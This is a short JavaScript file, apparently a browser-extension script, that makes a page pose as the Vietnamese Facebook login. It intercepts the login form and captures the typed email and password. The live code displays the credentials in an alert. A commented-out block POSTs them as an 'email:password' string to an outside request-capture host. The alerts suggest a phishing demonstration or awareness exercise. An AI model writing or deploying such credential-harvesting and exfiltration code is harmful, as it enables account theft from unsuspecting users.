// console.log("✅ Inject.js loaded");
// document.title = "Facebook - Đăng nhập hoặc đăng ký";

// const link = document.createElement("link");
// link.rel = "icon";
// link.href = chrome.runtime.getURL("fb.ico");
// document.head.appendChild(link);


document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const inputs = this.querySelectorAll("input");
  const email = inputs[0].value;
  const password = inputs[1].value;
  const combined = `${email}:${password}`;
  alert(
    "🕵️‍♂️ Your credentials have been captured!\n\n📨 Email/Phone: " +
      email +
      "\n🔐 Password: " +
      password +
      "\n\n💣 Data has been sent to the dark web."
  );

  //fetch("https://6wnfqxa7.requestrepo.com/", {
  //method: "POST",
  //body: combined,
  //})
  //.then(() => {
  //console.log("✅ Credentials sent as raw string.");
  //alert("Bạn đã bị lừa: Email/SĐT: " + email + " - Password:" + password);

  //})
  //.catch((err) => {
  //console.error("❌ Failed to send credentials", err);
  //});
});
